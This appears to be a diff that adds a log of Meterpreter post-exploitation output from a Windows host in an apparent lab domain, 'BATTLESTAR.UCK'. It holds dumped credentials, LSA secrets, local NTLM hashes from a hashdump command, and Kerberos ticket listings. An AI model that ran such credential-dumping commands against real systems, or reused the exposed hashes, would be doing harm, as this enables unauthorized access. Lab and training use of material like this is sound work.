@@ -1,0 +1,107 @@
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain      NTLM                              SHA1
+--------  ------      ----                              ----
+VIPER$    BATTLESTAR  de4fb50259a41f3d1342f9c66070118c  49ab5cc098cce742b3051c026a7ef5448fb4a131
+
+wdigest credentials
+===================
+
+Username  Domain      Password
+--------  ------      --------
+(null)    (null)      (null)
+VIPER$    BATTLESTAR  +:,j hmAIP-*T, JS%@l=sPQ=)XEB5Ehxa;[F<z;TtdR$@[jlj(sd!is25qH_D_\Llm:\N.&z*+5u,+PAk_"WKkZ$"PBDHe`/P>]r6lP8g=s%Q7IoQ<9U+Z0
+
+kerberos credentials
+====================
+
+Username  Domain          Password
+--------  ------          --------
+(null)    (null)          (null)
+viper$    BATTLESTAR.UCK  +:,j hmAIP-*T, JS%@l=sPQ=)XEB5Ehxa;[F<z;TtdR$@[jlj(sd!is25qH_D_\Llm:\N.&z*+5u,+PAk_"WKkZ$"PBDHe`/P>]r6lP8g=s%Q7IoQ<9U+Z0
+
+
+
+
+Domain : VIPER
+SysKey : 443604522e511e44a80271921aa12d1b
+
+Local name : VIPER ( S-1-5-21-3985166847-2761749007-21759358 )
+Domain name : BATTLESTAR ( S-1-5-21-3727129552-2706003751-2724073584 )
+Domain FQDN : battlestar.uck
+
+Policy subsystem is : 1.11
+LSA Key(s) : 1, default {63edbd57-aaba-6ec7-e888-8cce82b48f1c}
+  [00] {63edbd57-aaba-6ec7-e888-8cce82b48f1c} 368e5165d704cadcf404fb5bdec73bfcb0bfd7aa8e5ebe5edd59d1d6960def24
+
+Secret  : $MACHINE.ACC
+cur/text: +:,j hmAIP-*T, JS%@l=sPQ=)XEB5Ehxa;[F<z;TtdR$@[jlj(sd!is25qH_D_\Llm:\N.&z*+5u,+PAk_"WKkZ$"PBDHe`/P>]r6lP8g=s%Q7IoQ<9U+Z0
+    NTLM:de4fb50259a41f3d1342f9c66070118c
+    SHA1:49ab5cc098cce742b3051c026a7ef5448fb4a131
+old/text: +:,j hmAIP-*T, JS%@l=sPQ=)XEB5Ehxa;[F<z;TtdR$@[jlj(sd!is25qH_D_\Llm:\N.&z*+5u,+PAk_"WKkZ$"PBDHe`/P>]r6lP8g=s%Q7IoQ<9U+Z0
+    NTLM:de4fb50259a41f3d1342f9c66070118c
+    SHA1:49ab5cc098cce742b3051c026a7ef5448fb4a131
+
+Secret  : DefaultPassword
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 ed 47 ba 37 7a c2 f0 47 71 bd 4a a8 87 c4 b4 ed 66 19 45 43 13 79 0d 1b 07 ab f4 53 94 79 fe 67 87 12 ef 10 c6 cf b9 d1 
+    full: ed47ba377ac2f04771bd4aa887c4b4ed6619454313790d1b07abf4539479fe678712ef10c6cfb9d1
+    m/u : ed47ba377ac2f04771bd4aa887c4b4ed66194543 / 13790d1b07abf4539479fe678712ef10c6cfb9d1
+old/hex : 01 00 00 00 c9 22 d6 0b 83 9e dd 98 a7 ad 7a 5a c5 ff 4e bb 8a d2 6f 01 61 be bf d4 bc 70 54 70 fd df 46 12 a8 c5 e5 2d 98 6c 79 71 
+    full: c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f0161bebfd4bc705470fddf4612a8c5e52d986c7971
+    m/u : c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f01 / 61bebfd4bc705470fddf4612a8c5e52d986c7971
+
+Secret  : NL$KM
+cur/hex : 24 b8 1c 96 a5 7c dd 56 a4 a4 95 90 e2 a3 b3 46 21 00 87 e0 42 d5 f8 3e b6 9f b6 a6 31 57 c6 0e 29 9e 95 1c b2 10 6c 51 f6 25 45 2b 0d 2f 68 9f cf 50 93 4f f5 df 49 4c ab 30 ed b1 07 ec b2 fd 
+
+
+(Meterpreter 1)(C:\Windows\system32) > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7100a909c7ff05b266af3c42ec058c33:::
+Administrator01:1000:aad3b435b51404eeaad3b435b51404ee:7100a909c7ff05b266af3c42ec058c33:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+kara:1001:aad3b435b51404eeaad3b435b51404ee:c6b4b590dddfa35fa98ae59934b2366f:::
+Lee:1002:aad3b435b51404eeaad3b435b51404ee:e2c1c1d46ca9b797957f4bcff2b10ee3:::
+starbuck2:1003:aad3b435b51404eeaad3b435b51404ee:2e5945d428fcd3b9e66ca3e488c95d0f:::
+
+
+(Meterpreter 1)(C:\Windows\system32) > kerberos_ticket_list 
+[+] Kerberos tickets found in the current session.
+[00000000] - 0x00000012 - aes256_hmac      
+   Start/End/MaxRenew: 4/23/2025 12:05:35 PM ; 4/23/2025 10:05:26 PM ; 4/30/2025 12:05:26 PM
+   Server Name       : krbtgt/BATTLESTAR.UCK @ BATTLESTAR.UCK
+   Client Name       : viper$ @ BATTLESTAR.UCK
+   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
+
+[00000001] - 0x00000012 - aes256_hmac      
+   Start/End/MaxRenew: 4/23/2025 12:05:26 PM ; 4/23/2025 10:05:26 PM ; 4/30/2025 12:05:26 PM
+   Server Name       : krbtgt/BATTLESTAR.UCK @ BATTLESTAR.UCK
+   Client Name       : viper$ @ BATTLESTAR.UCK
+   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
+
+[00000002] - 0x00000012 - aes256_hmac      
+   Start/End/MaxRenew: 4/23/2025 12:05:35 PM ; 4/23/2025 10:05:26 PM ; 4/30/2025 12:05:26 PM
+   Server Name       : cifs/Galactica.battlestar.uck @ BATTLESTAR.UCK
+   Client Name       : viper$ @ BATTLESTAR.UCK
+   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+
+[00000003] - 0x00000012 - aes256_hmac      
+   Start/End/MaxRenew: 4/23/2025 12:05:35 PM ; 4/23/2025 10:05:26 PM ; 4/30/2025 12:05:26 PM
+   Server Name       : VIPER$ @ BATTLESTAR.UCK
+   Client Name       : viper$ @ BATTLESTAR.UCK
+   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
+
+[00000004] - 0x00000012 - aes256_hmac      
+   Start/End/MaxRenew: 4/23/2025 12:05:35 PM ; 4/23/2025 10:05:26 PM ; 4/30/2025 12:05:26 PM
+   Server Name       : LDAP/Galactica.battlestar.uck/battlestar.uck @ BATTLESTAR.UCK
+   Client Name       : viper$ @ BATTLESTAR.UCK
+   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+
+[00000005] - 0x00000012 - aes256_hmac      
+   Start/End/MaxRenew: 4/23/2025 12:05:26 PM ; 4/23/2025 10:05:26 PM ; 4/30/2025 12:05:26 PM
+   Server Name       : ldap/Galactica.battlestar.uck @ BATTLESTAR.UCK
+   Client Name       : viper$ @ BATTLESTAR.UCK
+   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+
